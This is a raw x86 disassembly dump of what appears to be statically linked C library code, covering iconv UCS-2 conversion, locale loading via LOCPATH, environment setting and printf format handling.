mov dword [var_18h], 0
mov ebx, dword [arg_1ch]
mov dword [var_sp_10h], 0
mov dword [var_ch], eax
mov dword [var_1ch], edx
lea eax, [var_2ch]
mov dword [var_8h], eax
mov edx, dword [var_30h]
mov dword [var_sp_14h], ebx
mov eax, dword [var_34h]
mov dword [esp], edx
mov dword [var_4h], eax
call dword [var_38h]
cmp eax, 4
mov ecx, eax
je 0x805c5ce
mov edx, dword [var_2ch]
mov eax, dword [var_14h]
cmp edx, eax
jne 0x805c5c0
mov esi, ecx
test esi, esi
jne 0x805c530
mov ebx, dword [arg_ch]
mov edx, dword [arg_10h]
mov eax, dword [ebx]
mov dword [var_14h], eax
mov edx, dword [edx]
mov eax, dword [ebx + 8]
mov dword [var_58h], edx
mov dword [var_5ch], eax
jmp 0x805c3e6
mov eax, dword [arg_24h]
test eax, eax
jne 0x805c541
mov eax, esi
add esp, 0x70
pop ebx
pop esi
pop edi
leave
ret
cmp esi, 7
jne 0x805c537
mov ebx, dword [arg_10h]
mov eax, dword [arg_14h]
mov ebx, dword [ebx]
sub eax, ebx
mov dword [var_58h], ebx
cmp eax, 3
jg 0x805c59c
xor ecx, ecx
mov eax, dword [arg_14h]
cmp dword [var_58h], eax
jae 0x805c58b
mov ebx, dword [arg_ch]
mov eax, dword [var_58h]
mov edx, dword [ebx + 0x14]
inc eax
mov ebx, dword [arg_10h]
mov dword [ebx], eax
mov ebx, dword [var_58h]
movzx eax, byte [ebx]
mov byte [ecx + edx + 4], al
mov ebx, dword [arg_14h]
mov edx, dword [arg_10h]
inc ecx
mov eax, dword [edx]
cmp eax, ebx
mov dword [var_58h], eax
jb 0x805c562
mov eax, dword [arg_ch]
mov edx, dword [eax + 0x14]
mov eax, dword [edx]
and eax, 0xfffffff8
or eax, ecx
mov dword [edx], eax
jmp 0x805c537
mov dword [var_ch], str.__gconv_transform_internal_ucs2reverse
mov dword [var_8h], 0x313
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.inend___inptrp___4
call fcn.0805efc0
mov ebx, dword [arg_10h]
sub eax, edx
add eax, eax
sub dword [ebx], eax
jmp 0x805c50f
cmp dword [var_54h], 5
jne 0x805c511
mov edx, dword [arg_ch]
xor esi, esi
mov eax, dword [edx]
mov dword [var_14h], eax
jmp 0x805c511
mov eax, dword [var_14h]
mov ebx, dword [arg_ch]
mov edx, dword [arg_1ch]
mov dword [ebx], eax
mov eax, dword [var_10h]
add dword [edx], eax
jmp 0x805c530
lea esi, [esi]
mov dword [esp], eax
call fcn.08083520
mov edx, dword [var_44h]
mov eax, dword [var_14h]
mov dword [var_ch], edx
mov dword [var_sp_10h], eax
mov edx, dword [arg_10h]
mov eax, dword [edx]
mov dword [var_8h], eax
mov eax, dword [var_58h]
mov dword [var_4h], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call dword [ebx + 4]
jmp 0x805c48b
mov ebx, dword [arg_18h]
mov dword [ebx], edi
jmp 0x805c537
mov eax, dword [var_48h]
test eax, eax
je 0x805c65a
test byte [var_5ch], 2
je 0x805c65a
mov eax, dword [var_48h]
mov ecx, ebx
mov dword [var_28h], ebx
inc dword [eax]
jmp 0x805c45a
mov dword [var_54h], 6
jmp 0x805c460
shr edx, 7
cmp edx, 0x1c00
je 0x805c455
mov ebx, dword [var_48h]
mov dword [var_54h], 6
test ebx, ebx
je 0x805c460
mov edx, dword [arg_ch]
mov ebx, dword [edx + 0x20]
test ebx, ebx
je 0x805c6f5
lea edi, [var_24h]
lea esi, [var_28h]
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08083520
mov edx, dword [arg_14h]
mov eax, dword [var_48h]
mov dword [var_18h], edi
mov dword [var_sp_10h], esi
mov dword [var_sp_14h], edx
mov dword [var_1ch], eax
mov edx, dword [arg_10h]
mov eax, dword [edx]
mov edx, dword [arg_8h]
mov dword [var_ch], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], edx
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call dword [ebx]
cmp eax, 6
mov dword [var_54h], eax
jne 0x805c6e5
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x805c697
cmp dword [var_54h], 6
mov ecx, dword [var_28h]
mov edi, dword [var_24h]
jne 0x805c45a
mov edx, dword [var_48h]
test edx, edx
je 0x805c460
test byte [var_5ch], 2
je 0x805c460
mov ebx, dword [var_48h]
add ecx, 4
inc dword [ebx]
jmp 0x805c457
mov dword [var_54h], 5
jmp 0x805c460
mov dword [var_54h], 7
jmp 0x805c460
mov edi, dword [var_24h]
jmp 0x805c460
mov dword [var_ch], str.internal_ucs2reverse_loop_single
mov dword [var_8h], 0x1a9
mov dword [var_4h], str..._iconv_loop.c
mov dword [esp], str.inptr___bytebuf____state____count__7_
jmp 0x805c5bb
cmp dword [var_50h], 7
jne 0x805c3c8
lea eax, [ecx + 4]
cmp dword [var_4ch], eax
je 0x805c7a2
mov eax, dword [var_4ch]
mov edx, dword [esi]
sub eax, ecx
and edx, 7
sub eax, edx
mov edx, dword [arg_10h]
add dword [edx], eax
cmp ecx, dword [var_4ch]
jae 0x805c3c8
mov eax, ecx
inc ecx
mov dword [var_20h], ecx
movzx eax, byte [eax]
mov byte [esi + ebx + 4], al
mov ecx, dword [var_20h]
inc ebx
cmp ecx, dword [var_4ch]
jb 0x805c787
jmp 0x805c3c8
mov dword [var_ch], str.internal_ucs2reverse_loop_single
mov dword [var_8h], 0x1bb
mov dword [var_4h], str..._iconv_loop.c
mov dword [esp], str.inend___bytebuf_4_
jmp 0x805c5bb
mov edi, dword [var_48h]
test edi, edi
je 0x805c7e3
test byte [var_3ch], 2
je 0x805c7e3
mov edx, dword [var_48h]
lea ecx, [var_14h]
mov dword [var_20h], ecx
inc dword [edx]
jmp 0x805c38e
mov dword [var_50h], 6
jmp 0x805c38e
shr edx, 7
cmp edx, 0x1c00
je 0x805c388
mov eax, dword [var_48h]
mov dword [var_50h], 6
test eax, eax
je 0x805c38e
mov edx, dword [arg_ch]
mov edi, dword [edx + 0x20]
test edi, edi
je 0x805c87b
mov eax, dword [edi]
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_48h]
lea edx, [var_bp_1ch]
mov dword [var_18h], edx
lea edx, [var_20h]
mov dword [var_sp_10h], edx
mov edx, dword [arg_10h]
mov dword [var_1ch], eax
mov eax, dword [var_4ch]
mov dword [var_sp_14h], eax
mov eax, dword [edx]
mov edx, dword [arg_8h]
mov dword [var_ch], eax
mov eax, dword [edi + 0xc]
mov dword [esp], edx
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call dword [edi]
cmp eax, 6
mov dword [var_50h], eax
jne 0x805c86e
mov edi, dword [edi + 0x10]
test edi, edi
jne 0x805c81a
cmp dword [var_50h], 6
mov ecx, dword [var_20h]
jne 0x805c38e
mov eax, dword [var_48h]
test eax, eax
je 0x805c38e
test byte [var_3ch], 2
je 0x805c38e
mov eax, dword [var_48h]
add ecx, 4
inc dword [eax]
jmp 0x805c38b
mov edx, dword [arg_14h]
mov eax, dword [arg_10h]
cmp ecx, edx
mov dword [eax], edx
jae 0x805c8bf
mov eax, ecx
inc ecx
mov dword [var_20h], ecx
movzx eax, byte [eax]
mov byte [esi + ebx + 4], al
mov ecx, dword [var_20h]
inc ebx
cmp ecx, dword [arg_14h]
jb 0x805c8a9
mov edx, 7
jmp 0x805c3cb
mov dword [var_ch], str.__gconv_transform_internal_ucs2reverse
mov dword [var_8h], 0x22e
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.outbufstart____void__0_
jmp 0x805c5bb
mov ebx, dword [arg_18h]
mov edx, dword [ebx]
jmp 0x805c290
mov eax, dword [arg_18h]
test eax, eax
jne 0x805c969
mov edx, dword [arg_ch]
xor esi, esi
mov eax, dword [edx + 0x14]
mov dword [eax], 0
mov dword [eax + 4], 0
test byte [edx + 8], 1
jne 0x805c537
mov eax, dword [var_38h]
mov dword [esp], eax
call fcn.08083520
mov edx, dword [arg_24h]
mov dword [var_18h], ebx
mov eax, dword [var_34h]
mov ebx, dword [arg_1ch]
mov dword [var_sp_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_1ch], edx
mov dword [var_4h], eax
mov edx, dword [var_30h]
mov dword [var_sp_14h], ebx
mov dword [esp], edx
call dword [var_38h]
mov esi, eax
jmp 0x805c537
mov dword [var_ch], str.__gconv_transform_internal_ucs2reverse
mov dword [var_8h], 0x19f
jmp 0x805c8d9
push ebp
mov ebp, esp
mov eax, dword [arg_ch]
mov eax, dword [eax]
mov dword [arg_ch], eax
mov eax, dword [arg_8h]
mov eax, dword [eax]
mov dword [arg_8h], eax
leave
jmp fcn.08076e50
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xa4
mov esi, dword [arg_8h]
test esi, esi
js 0x805da46
cmp dword [arg_8h], 0xc
jg 0x805da46
mov ebx, dword [arg_ch]
test ebx, ebx
je 0x805dac8
mov edx, dword [arg_8h]
mov ecx, 0x80a9a40
mov eax, dword [arg_ch]
mov ebx, dword [ecx + edx*4 + 0x40]
mov dword [esp], eax
mov dword [var_4h], ebx
call fcn.08076e50
mov edx, ebx
test eax, eax
jne 0x805d5e7
lea esp, [var_ch]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_94h], 0
mov dword [var_90h], 0
mov dword [esp], str.LOCPATH
call fcn.080631c0
test eax, eax
je 0x805d614
cmp byte [eax], 0
jne 0x805da6f
cmp dword [arg_8h], 6
je 0x805d767
mov eax, dword [arg_ch]
mov dword [var_98h], eax
mov eax, 0
test eax, eax
je 0x805d63c
mov dword [esp], 0x80aacb0
call section.
mov edx, dword [var_90h]
mov eax, dword [var_94h]
lea esi, [var_98h]
mov ecx, dword [arg_8h]
mov dword [esp], esi
call fcn.0805dba0
sub esp, 4
mov ebx, eax
test eax, eax
je 0x805d75b
cmp dword [eax + 0x18], 0xffffffff
je 0x805d673
mov dword [eax + 0x18], 0xffffffff
mov eax, dword [var_98h]
cmp eax, 0x80a0139
je 0x805d696
mov dword [esp], eax
call fcn.08076e80
test eax, eax
mov dword [var_98h], eax
je 0x805d75b
mov edx, dword [arg_8h]
mov dword [var_4h_2], esi
mov dword [esp], edx
call fcn.0805d400
test eax, eax
mov edi, eax
je 0x805d746
mov ecx, dword [arg_8h]
mov esi, 0x80a9a40
mov eax, dword [ecx*4 + 0x8093f20]
mov dword [ecx*4 + 0x80a9a40], ebx
test eax, eax
jne 0x805d742
mov edx, dword [arg_8h]
mov ebx, dword [var_98h]
mov eax, dword [esi + edx*4 + 0x40]
cmp eax, ebx
je 0x805d6f0
cmp eax, 0x80a0139
je 0x805d6e9
mov dword [esp], eax
call fcn.08051180
mov ecx, dword [arg_8h]
mov dword [esi + ecx*4 + 0x40], ebx
mov eax, dword [0x80a9a98]
cmp eax, edi
je 0x805d70e
cmp eax, 0x80a0139
je 0x805d708
mov dword [esp], eax
call fcn.08051180
mov dword [0x80a9a98], edi
inc dword [0x80aad24]
mov eax, 0
test eax, eax
je 0x805d729
mov dword [esp], 0x80aacb0
call section.
mov eax, dword [var_94h]
mov dword [esp], eax
call fcn.08051180
mov edx, dword [var_98h]
jmp 0x805d5dd
call eax
jmp 0x805d6c9
mov eax, dword [var_98h]
cmp eax, 0x80a0139
je 0x805d75b
mov dword [esp], eax
call fcn.08051180
mov dword [var_98h], 0
jmp 0x805d714
mov dword [arg_8h], 0
mov esi, esi
cmp dword [arg_8h], 6
je 0x805d780
mov ecx, dword [arg_ch]
mov edx, dword [arg_8h]
mov dword [ebp + edx*4 - 0x4c], ecx
inc dword [arg_8h]
cmp dword [arg_8h], 0xc
jle 0x805d770
mov eax, dword [arg_ch]
mov dword [arg_8h], 0xd
mov dword [var_4h], 0x3b
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
jne 0x805d988
mov eax, 0
test eax, eax
je 0x805d7c0
mov dword [esp], 0x80aacb0
call section.
mov eax, dword [arg_8h]
dec dword [arg_8h]
test eax, eax
jle 0x805d850
mov ecx, dword [arg_8h]
lea esi, [ebp + ecx*4 - 0x4c]
cmp dword [arg_8h], 6
je 0x805d843
mov edx, dword [var_90h]
mov eax, dword [var_94h]
mov dword [esp], esi
mov ecx, dword [arg_8h]
call fcn.0805dba0
mov edx, dword [arg_8h]
sub esp, 4
test eax, eax
mov dword [ebp + edx*4 - 0x8c], eax
je 0x805d850
cmp dword [eax + 0x18], 0xffffffff
je 0x805d810
mov dword [eax + 0x18], 0xffffffff
mov ecx, dword [arg_8h]
mov ebx, dword [ebp + ecx*4 - 0x4c]
cmp ebx, 0x80a0139
je 0x805d843
mov eax, 0x80a9a40
mov edi, dword [eax + ecx*4 + 0x40]
mov dword [esp], ebx
mov dword [var_4h_2], edi
call fcn.08076e50
test eax, eax
jne 0x805d96c
mov edx, dword [arg_8h]
mov dword [ebp + edx*4 - 0x4c], edi
mov eax, dword [arg_8h]
sub esi, 4
dec dword [arg_8h]
test eax, eax
jg 0x805d7d5
mov ecx, dword [arg_8h]
xor edi, edi
test ecx, ecx
js 0x805d952
test edi, edi
je 0x805d917
mov dword [arg_8h], 0
lea esi, [esi]
cmp dword [arg_8h], 6
je 0x805d8bc
mov edx, dword [arg_8h]
mov esi, 0x80a9a40
mov eax, dword [ebp + edx*4 - 0x8c]
mov dword [edx*4 + 0x80a9a40], eax
mov eax, dword [edx*4 + 0x8093f20]
test eax, eax
jne 0x805d913
mov ecx, dword [arg_8h]
mov ebx, dword [ebp + ecx*4 - 0x4c]
mov eax, dword [esi + ecx*4 + 0x40]
cmp eax, ebx
je 0x805d8bc
cmp eax, 0x80a0139
je 0x805d8b5
mov dword [esp], eax
call fcn.08051180
mov eax, dword [arg_8h]
mov dword [esi + eax*4 + 0x40], ebx
inc dword [arg_8h]
cmp dword [arg_8h], 0xc
jle 0x805d870
mov eax, dword [0x80a9a98]
cmp eax, edi
je 0x805d8e3
cmp eax, 0x80a0139
je 0x805d8dd
mov dword [esp], eax
call fcn.08051180
mov dword [0x80a9a98], edi
inc dword [0x80aad24]
mov eax, 0
test eax, eax
je 0x805d8fe
mov dword [esp], 0x80aacb0
call section.
mov eax, dword [var_94h]
mov dword [esp], eax
call fcn.08051180
mov edx, edi
jmp 0x805d5dd
call eax
jmp 0x805d897
inc dword [arg_8h]
cmp dword [arg_8h], 0xc
jg 0x805d8e9
cmp dword [arg_8h], 6
je 0x805d947
mov edx, dword [arg_8h]
mov eax, dword [ebp + edx*4 - 0x4c]
cmp eax, 0x80a0139
je 0x805d947
mov ecx, 0x80a9a40
cmp eax, dword [ecx + edx*4 + 0x40]
je 0x805d947
mov dword [esp], eax
call fcn.08051180
inc dword [arg_8h]
cmp dword [arg_8h], 0xc
jle 0x805d920
jmp 0x805d8e9
lea eax, [var_4ch]
mov dword [esp], 6
mov dword [var_4h], eax
call fcn.0805d400
mov edi, eax
jmp 0x805d85d
mov dword [esp], ebx
call fcn.08076e80
mov ecx, dword [arg_8h]
test eax, eax
mov dword [ebp + ecx*4 - 0x4c], eax
jne 0x805d843
jmp 0x805d850
mov edx, dword [arg_ch]
mov dword [esp], edx
call fcn.08053400
mov ecx, dword [arg_ch]
lea edx, [eax + 1]
add eax, 0x13
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1fh]
mov dword [var_8h], edx
mov dword [var_4h], ecx
and eax, 0xfffffff0
mov dword [esp], eax
call fcn.08053770
mov dword [var_9ch], eax
mov dword [var_4h], 0x3d
mov eax, dword [var_9ch]
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
mov dword [var_a0h], eax
je 0x805da2b
xor ebx, ebx
cld
cmp ebx, 6
je 0x805d9fb
mov edx, dword [var_a0h]
sub edx, dword [var_9ch]
cmp edx, dword [ebx*4 + str._b_n_a_n_v_v]
je 0x805da58
inc ebx
cmp ebx, 0xc
jle 0x805d9e1
cmp ebx, 0xd
je 0x805da46
mov eax, dword [var_a0h]
mov dword [var_4h], 0x3b
inc eax
mov dword [ebp + ebx*4 - 0x4c], eax
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
je 0x805da2b
mov byte [eax], 0
inc eax
jmp 0x805d9b8
xor ebx, ebx
cmp ebx, 6
je 0x805da3b
mov edx, dword [arg_ch]
cmp dword [ebp + ebx*4 - 0x4c], edx
je 0x805da46
inc ebx
cmp ebx, 0xc
jle 0x805da2d
jmp 0x805d7ab
call fcn.08048b20
xor edx, edx
mov dword [eax], 0x16
jmp 0x805d5dd
mov edi, dword [ebx*4 + 0x8093ea0]
mov esi, dword [var_9ch]
cmp edx, edx
mov ecx, edx
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x805d9fb
jmp 0x805da01
lea esi, [var_90h]
lea ebx, [var_94h]
mov dword [var_4h], 0x3a
mov dword [var_sp_ch], esi
mov dword [var_8h], ebx
mov dword [esp], eax
call fcn.08077500
xor edx, edx
test eax, eax
jne 0x805d5dd
mov dword [var_sp_ch], 0x3a
mov dword [var_8h], str._usr_lib_locale
mov dword [var_4h], esi
mov dword [esp], ebx
call fcn.08077600
xor edx, edx
test eax, eax
je 0x805d614
jmp 0x805d5dd
mov eax, dword [arg_8h]
mov edx, dword [eax*4 + 0x80a9a80]
jmp 0x805d5dd
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov eax, dword [eax]
sub eax, dword [edx]
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [0x80a9a40]
mov dword [var_4h], ebx
lea edx, [eax + 0x24]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [0x80a9a74], eax
mov eax, dword [edx + 0xc]
add eax, 0x200
mov dword [0x80a9a78], eax
mov eax, dword [edx + 4]
add eax, 0x200
mov dword [0x80a9a7c], eax
mov eax, 0
test eax, eax
je 0x805ef98
mov dword [esp], 3
call section.
cmp eax, 0x80a9a40
je 0x805ef1d
mov ebx, dword [var_4h]
leave
ret
mov ebx, 0
test ebx, ebx
je 0x805ef8c
mov eax, dword [0x80a9a74]
mov dword [esp], 4
mov dword [var_sp_4h], eax
call section.
test ebx, ebx
je 0x805ef80
mov eax, dword [0x80a9a7c]
mov dword [esp], 6
mov dword [var_sp_4h], eax
call section.
test ebx, ebx
je 0x805ef6f
mov eax, dword [0x80a9a78]
mov dword [esp], 5
mov dword [var_sp_4h], eax
call section.
jmp 0x805ef18
mov eax, dword [0x80a9a78]
mov dword [0x80aad14], eax
jmp 0x805ef18
nop
lea esi, [esi]
mov eax, dword [0x80a9a7c]
mov dword [0x80aad1c], eax
jmp 0x805ef54
mov eax, dword [0x80a9a74]
mov dword [0x80aad18], eax
jmp 0x805ef3b
cmp dword [0x80a9ab4], 0x80a9a40
jmp 0x805ef16
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_8h]
mov esi, dword [arg_ch]
lea edx, [ebx + 0x18]
lea eax, [esi + 0x18]
mov dword [esp], edx
mov dword [var_sp_4h], eax
call fcn.08076e50
test eax, eax
jne 0x805f282
mov eax, dword [esi]
mov dword [var_sp_4h], eax
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
jne 0x805f282
mov eax, dword [ebx + 4]
sub eax, dword [esi + 4]
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_ch]
mov eax, dword [eax]
mov dword [arg_ch], eax
mov eax, dword [arg_8h]
mov eax, dword [eax]
mov dword [arg_8h], eax
leave
jmp fcn.08077440
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
test ebx, ebx
je 0x8063609
cmp byte [ebx], 0
je 0x8063609
mov dword [var_sp_4h], 0x3d
mov dword [esp], ebx
call fcn.08076ce0
test eax, eax
je 0x806361e
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
mov ebx, dword [var_4h]
leave
ret
mov eax, dword [arg_10h]
mov dword [var_8h], 0
mov dword [esp], ebx
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
call fcn.080632c0
jmp 0x8063619
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [arg_14h]
mov dword [var_ch], 0
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08063840
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 0x20
mov eax, dword [arg_14h]
mov ebx, dword [arg_ch]
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
lea eax, [var_4h]
mov dword [var_sp_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08063c00
mov edx, eax
lea eax, [var_4h]
cmp edx, eax
jae 0x8063ea1
movzx eax, byte [edx]
inc edx
mov byte [ebx], al
lea eax, [var_4h]
inc ebx
cmp edx, eax
jb 0x8063e93
mov eax, ebx
add esp, 0x20
pop ebx
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 0x34
mov edx, dword [arg_ch]
mov eax, dword [arg_18h]
mov ebx, dword [arg_10h]
mov dword [var_10h], eax
mov dword [var_4h], edx
mov eax, dword [arg_14h]
mov dword [var_ch], eax
lea eax, [var_bp_4h]
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08063ca0
mov edx, eax
lea eax, [var_bp_4h]
cmp edx, eax
jae 0x8063efe
lea esi, [esi]
movzx eax, byte [edx]
inc edx
mov byte [ebx], al
lea eax, [var_bp_4h]
inc ebx
cmp edx, eax
jb 0x8063ef0
mov eax, ebx
add esp, 0x34
pop ebx
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x18
mov eax, dword [arg_ch]
mov esi, dword [arg_8h]
mov dword [var_10h], esp
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
cmp ecx, edx
mov eax, edx
cmovge eax, ecx
add eax, 0x32
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1fh]
and eax, 0xfffffff0
cmp ecx, edx
cmovge edx, ecx
lea eax, [edx + eax + 0x20]
mov dword [var_14h], eax
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x8067936
mov byte [eax], 0x25
inc dword [esi + 0x14]
mov edx, dword [var_ch]
mov edi, 1
movzx eax, byte [edx + 0xc]
test al, 8
je 0x806768a
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x8067915
mov byte [eax], 0x23
inc dword [esi + 0x14]
mov edx, dword [var_ch]
mov edi, 2
movzx eax, byte [edx + 0xc]
test al, 0x80
je 0x80676a8
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x80678f9
mov byte [eax], 0x27
inc dword [esi + 0x14]
mov edx, dword [var_ch]
inc edi
movzx eax, byte [edx + 0xc]
test al, 0x40
je 0x80678d7
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x80678bb
mov byte [eax], 0x2b
inc dword [esi + 0x14]
mov edx, dword [var_ch]
inc edi
movzx eax, byte [edx + 0xc]
test al, 0x20
je 0x80676e1
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x806789f
mov byte [eax], 0x2d
inc dword [esi + 0x14]
inc edi
mov eax, dword [var_ch]
cmp dword [eax + 0x10], 0x30
je 0x8067873
mov edx, dword [var_ch]
test byte [edx + 0xd], 8
je 0x806770a
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x8067857
mov byte [eax], 0x49
inc dword [esi + 0x14]
inc edi
mov eax, dword [var_ch]
mov eax, dword [eax + 4]
test eax, eax
jne 0x80677ef
mov eax, dword [var_ch]
cmp dword [eax], 0xffffffff
je 0x806777d
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x80677d6
mov byte [eax], 0x2e
inc dword [esi + 0x14]
mov dword [var_ch], 0
mov dword [var_8h], 0xa
inc edi
mov edx, dword [var_14h]
mov dword [var_4h], edx
mov edx, dword [var_ch]
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08063c00
cmp eax, dword [var_14h]
mov ebx, eax
jae 0x806777d
mov esi, esi
movsx eax, byte [ebx]
mov edx, dword [esi + 0x14]
inc ebx
cmp edx, dword [esi + 0x18]
jae 0x80677c5
mov byte [edx], al
inc dword [esi + 0x14]
movzx eax, al
inc eax
je 0x80677ad
inc edi
cmp ebx, dword [var_14h]
jb 0x8067760
mov edx, dword [var_ch]
mov eax, dword [edx + 8]
test eax, eax
je 0x80677a0
mov edx, dword [esi + 0x14]
cmp edx, dword [esi + 0x18]
jae 0x80677b4
mov byte [edx], al
inc dword [esi + 0x14]
movzx eax, al
inc eax
je 0x80677ad
inc edi
nop
lea esi, [esi]
mov eax, edi
mov esp, dword [var_10h_2]
lea esp, [var_ch_2]
pop ebx
pop esi
pop edi
leave
ret
mov edi, 0xffffffff
jmp 0x80677a0
movzx eax, al
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x8067797
movzx eax, al
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x8067774
mov dword [var_4h], 0x2e
mov dword [esp], esi
call fcn.0804d840
inc eax
jne 0x8067732
jmp 0x80677ad
mov dword [var_ch], 0
mov dword [var_8h], 0xa
mov edx, dword [var_14h]
mov dword [var_4h], edx
mov edx, dword [var_ch]
mov eax, dword [edx + 4]
mov dword [esp], eax
call fcn.08063c00
cmp eax, dword [var_14h]
mov ebx, eax
jae 0x8067718
nop
movsx eax, byte [ebx]
mov edx, dword [esi + 0x14]
inc ebx
cmp edx, dword [esi + 0x18]
jae 0x8067846
mov byte [edx], al
inc dword [esi + 0x14]
movzx eax, al
inc eax
je 0x80677ad
inc edi
cmp ebx, dword [var_14h]
jb 0x8067820
jmp 0x8067718
movzx eax, al
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x8067834
mov dword [var_4h], 0x49
mov dword [esp], esi
call fcn.0804d840
inc eax
jne 0x8067709
jmp 0x80677ad
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x8067887
mov byte [eax], 0x30
inc dword [esi + 0x14]
inc edi
jmp 0x80676ee
mov dword [var_4h], 0x30
mov dword [esp], esi
call fcn.0804d840
inc eax
jne 0x8067881
jmp 0x80677ad
mov dword [var_4h], 0x2d
mov dword [esp], esi
call fcn.0804d840
inc eax
jne 0x80676e0
jmp 0x80677ad
mov dword [var_4h], 0x2b
mov dword [esp], esi
call fcn.0804d840
inc eax
jne 0x80676c2
jmp 0x80677ad
test al, 0x10
je 0x80676ca
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x80678ef
mov byte [eax], 0x20
jmp 0x80676bf
mov dword [var_4h], 0x20
jmp 0x80678c3
mov dword [var_4h], 0x27
mov dword [esp], esi
call fcn.0804d840
inc eax
jne 0x80676a0
jmp 0x80677ad
mov dword [var_4h], 0x23
mov dword [esp], esi
mov edi, 0xffffffff
call fcn.0804d840
inc eax
jne 0x806767e
jmp 0x80677a0
mov dword [var_4h], 0x25
mov dword [esp], esi
mov edi, 0xffffffff
call fcn.0804d840
inc eax
jne 0x806765c
jmp 0x80677a0
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_8h]
mov esi, dword [arg_ch]
mov eax, dword [ebx + 0x14]
mov edx, dword [ebx + 0x10]
mov edi, dword [ebx + 0x98]
mov ecx, eax
sub ecx, edx
jne 0x8067a8b
cmp eax, dword [ebx + 0x18]
jae 0x8067a71
mov edx, esi
mov byte [eax], dl
inc dword [ebx + 0x14]
movzx eax, dl
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov edx, esi
mov dword [arg_8h], ebx
mov edi, dword [var_4h]
movzx eax, dl
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov dword [arg_ch], eax
leave
jmp fcn.0804d840
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_sp_4h], edx
mov dword [var_sp_8h], ecx
call dword [eax + 0x1c]
mov edx, dword [ebx + 0x14]
sub edx, eax
mov dword [ebx + 0x14], edx
mov eax, edx
jmp 0x8067a57
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
cmp ebx, 0xff
ja 0x806a128
mov edx, dword [0x80aad28]
test edx, edx
je 0x806a0f8
mov eax, dword [arg_ch]
mov dword [edx + ebx*4], eax
mov eax, dword [0x80aad94]
mov edx, dword [arg_10h]
mov dword [eax + ebx*4], edx
xor edx, edx
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov dword [var_sp_4h], 8
mov dword [esp], 0x100
call fcn.08051730
test eax, eax
mov dword [0x80aad94], eax
mov edx, 0xffffffff
je 0x806a0f1
lea edx, [eax + 0x400]
mov dword [0x80aad28], edx
jmp 0x806a0de
call fcn.08048b20
mov edx, 0xffffffff
mov dword [eax], 0x16
jmp 0x806a0f1
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov eax, dword [arg_ch]
mov dword [var_10h], esp
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
cmp ecx, edx
mov eax, edx
cmovge eax, ecx
lea eax, [eax*4 + 0x90]
sub esp, eax
lea eax, [var_17h]
and eax, 0xfffffff0
cmp ecx, edx
cmovge edx, ecx
lea edx, [eax + edx*4 + 0x80]
